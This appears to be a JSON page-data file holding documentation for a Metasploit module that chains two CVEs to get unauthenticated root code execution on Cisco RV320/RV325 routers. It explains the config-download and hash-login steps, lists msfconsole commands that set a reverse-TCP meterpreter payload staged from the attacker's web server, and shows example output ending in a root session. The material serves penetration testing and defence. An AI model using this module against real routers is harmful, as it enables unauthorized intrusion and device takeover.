{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/cisco_rv32x_rce","result":{"data":{"moduleMetadataJson":{"id":"3413b87d-903d-5d1c-96a8-aa24fe07f413","name":"Cisco RV320 and RV325 Unauthenticated Remote Code Execution","fullname":"exploit/linux/http/cisco_rv32x_rce","description":"This exploit module combines an information disclosure (CVE-2019-1653)\n        and a command injection vulnerability (CVE-2019-1652) together to gain\n        unauthenticated remote code execution on Cisco RV320 and RV325 small business\n        routers. Can be exploited via the WAN interface of the router. Either via HTTPS\n        on port 443 or HTTP on port 8007 on some older firmware versions.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/cisco_rv32x_rce","documentationSlug":"/modules/documentation/exploit/linux/http/cisco_rv32x_rce","referencesSlug":"/modules/references/exploit/linux/http/cisco_rv32x_rce"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module automatically exploits two vulnerabilities to create an effectively\nunauthenticated remote code execution on RV320 and RV325 routers.</p>\n<p>The module will perform the following steps:</p>\n<p>First the module will download the configuration. Then it will extract the MD5\npassword hash for the web interface user. The MD5 password hash is directly\naccepted during login instead of the plain text password. With the MD5 hash the\nmodule will authenticate to the web interface of the router and get a valid\nauthentication cookie. </p>\n<p>The second step is using the authentication cookie to\nsend an authenticated request to the web interface which exploits a command\ninjection vulnerability. The injection is limited to ~50 characters. Therefore,\nthe module uses a web server to stage a shell payload for the MIPS64\narchitecture of the router. Depending on the payload the module will result in\na shell or meterpreter session.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application:</h2>\n<p>Cisco Small Business Routers RV320 and RV325 with firmware versions between\n1.4.2.15 and 14.2.20.</p>\n<p>Link to vulnerable Firmware Version:\n<a href=\"https://software.cisco.com/download/home/284005929/type/282465789/release/1.4.2.20?i=!pp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://software.cisco.com/download/home/284005929/type/282465789/release/1.4.2.20?i=!pp</a></p>\n<p>Links to Advisories:\nPart 1 of the exploit (configuration download):\n<a href=\"https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export</a></p>\n<p>Part 2 of the exploit (command injection in web interface):\n<a href=\"https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection</a></p>\n<p>Advisories by vendor:\n<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info</a>\n<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject</a></p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>RHOSTS</strong></p>\n<p>Configure the remote vulnerable system.</p>\n<p><strong>RPORT</strong></p>\n<p>Configure the TCP port of the HTTP/HTTPS management web interface.</p>\n<p><strong>USE_SSL</strong></p>\n<p>This flag controls whether the remote management web interface is accessible\nvia HTTPS or not. Should be false for HTTP and true for HTTPS.</p>\n<p><strong>PAYLOAD</strong></p>\n<p>Configure the Metasploit payload that you want to stage. Must be for MIPS64\narch.  Set payload Options accordingly.</p>\n<p><strong>SRVHOST</strong></p>\n<p>The module stages the payload via a web server. This is the binding interface\nIP. Default can be set to 0.0.0.0. </p>\n<p><strong>HTTPDelay</strong></p>\n<p>This configures how long the module should wait for the incoming HTTP\nconnection to the HTTP stager.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Have exploitable RV320 or RV325 router (exampe IP: 192.168.1.1):</li>\n<li>Start <code class=\"language-text\">msfconsole</code>:</li>\n<li>Do:  <code class=\"language-text\">use exploit/linux/http/cisco_rv32x_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS 192.168.1.1</code></li>\n<li>Do: <code class=\"language-text\">set payload linux/mips64/meterpreter_reverse_tcp</code> (Set the MIPS64 payload you want to use)</li>\n<li>Do: <code class=\"language-text\">set LHOST 192.168.1.2</code> (Setting your own IP here, example: 192.168.1.2)</li>\n<li>Do: <code class=\"language-text\">set RPORT 8007</code> (Set the remote Port on which the router web interface is accessible)</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Gives you a privileged (uid=0) shell or in the example a meterpreter session.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Exploiting a vulnerable RV320 router with publicly accessible HTTPS web\ninterface on TCP port 443: </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/cisco_rv32x_rce) &gt; set RHOSTS 192.168.1.1\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set payload linux/mips64/meterpreter_reverse_tcp\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set LHOST 192.168.1.2\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set RPORT 443\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set USE_SSL true\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; run</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Demo example output for the module:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/cisco_rv32x_rce \nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; show options\n\nModule options (exploit/linux/http/cisco_rv32x_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  15               yes       Time that the HTTP Server will wait for the payload request\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target address range or CIDR identifier\n   RPORT      8007             yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   URIPATH    /                yes       The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)\n   USE_SSL    false            no        Negotiate SSL/TLS for outgoing connections\n   VHOST                       no        HTTP server virtual host\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   LINUX MIPS64\n\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set RHOSTS 192.168.1.1\nRHOSTS =&gt; 192.168.1.1\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set payload linux/mips64/meterpreter_reverse_tcp\npayload =&gt; linux/mips64/meterpreter_reverse_tcp\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set LHOST 192.168.1.2\nLHOST =&gt; 192.168.1.2\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set RPORT 443\nRPORT =&gt; 443\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; set USE_SSL true\nUSE_SSL =&gt; true\nmsf5 exploit(linux/http/cisco_rv32x_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http://192.168.1.2:8080/\n[*] Server started.\n[*] Downloading configuration from 192.168.1.1:443\n[*] Using SSL connection to router.\n[*] Successfully downloaded config\n[*] Got MD5-Hash: dfead10390e560aea745ccba53e044ed\n[*] Loging in as user cisco using password hash.\n[*] Using default auth_key 1964300002\n[*] Successfully logged in as user cisco.\n[*] Got cookies: mlap=RGVmYXVsdDE6Ojo6Y2lzY28=;\n[*] Sending payload. Staging via http://192.168.1.2:8080/.\n[*] 192.168.1.1:443 - Payload request received: /\n[*] Waiting for stager connection timed out. Try increasing the delay.\n[*] Meterpreter session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.1:48580) at 2019-03-14 10:00:00 +0100\n[*] Server stopped.\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=99, euid=0, egid=99</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3413b87d-903d-5d1c-96a8-aa24fe07f413"}}}